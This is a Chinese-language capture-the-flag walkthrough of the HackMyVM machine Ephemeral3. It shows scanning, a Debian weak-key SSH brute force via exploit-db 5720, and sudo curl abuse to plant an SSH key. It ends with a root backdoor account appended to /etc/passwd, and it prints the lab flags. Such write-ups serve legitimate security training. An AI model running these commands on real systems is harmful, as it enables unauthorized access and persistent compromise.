# Ephemeral3

2025.02.11 https://hackmyvm.eu/machines/machine.php?vm=Ephemeral3

[video](https://www.bilibili.com/video/BV1yBNCeeEUQ/?spm_id_from=333.1387.0.0&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web，主页是 apache 默认页面，gobuster 进行扫描，发现: http://192.168.5.40/note.txt

```
Hey! I just generated your keys with OpenSSL. You should be able to use your private key now!
If you have any questions just email me at henry@ephemeral.com
```

发现一个可能存在的用户名 henry

发现另外一个目录: http://192.168.5.40/agency 但是是个静态网页，其他没发现什么有用信息。

还是关注一下 note 中的提示吧，提示生成了私钥，可以用私钥进行登陆，看看 openssl 有没有可以利用的漏洞，之前有一个 Predictable PRNG Brute Force SSH 进行尝试。https://www.exploit-db.com/exploits/5720

```
searchsploit -m linux/remote/5720.py

1. Download https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
2. Extract it to a directory
3. Execute the python script
   - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
```

执行没有找到：

```
python2 5720.py rsa/2048 192.168.5.40 henry 22 5
```

可能是用户名不对，同时在 http://192.168.5.40/agency/ 底部发现了另外一个邮箱：randy@ephemeral.com 发现了另外一个可能的用户名 randy 再次尝试执行脚本：

```
python2 5720.py rsa/2048 192.168.5.40 randy 22 5

找到私钥 0028ca6d22c68ed0a1e3f6f79573100a-31671
```

进行登陆：

```
ssh -i rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 randy@192.168.5.40
```

sudo -l 发现：(henry) NOPASSWD: /usr/bin/curl 可以先读取 henry 文件夹下的 user flag:

```
randy@ephemeral:/home/henry$ sudo -u henry curl file:///home/henry/user.txt -o /tmp/user.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  33000      0 --:--:-- --:--:-- --:--:-- 33000
randy@ephemeral:/home/henry$ cat /tmp/user.txt
9c8e36b0cb30f09300592cb56bca0c3a
```

同时利用 curl 将公钥信息写入到 authorized_keys 中：

```
ssh-keygen -t rsa -f ./id_rsa
sudo -u henry curl file:///home/randy/id_rsa.pub -o /home/henry/.ssh/authorized_keys
```

然后使用生成的私钥登陆：

```
ssh -i id_rsa henry@192.168.5.40
henry@ephemeral:~$ id
uid=1001(henry) gid=1001(henry) groups=1001(henry)
```

枚举后发现 /etc/passwd 对 henry 用户可写，直接添加一个超级用户：

```
openssl passwd -1 -salt new 123

echo 'admin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
su admin
cd /root
cat root.txt
b0a3dec84d09f03615f768c8062cec4d
```
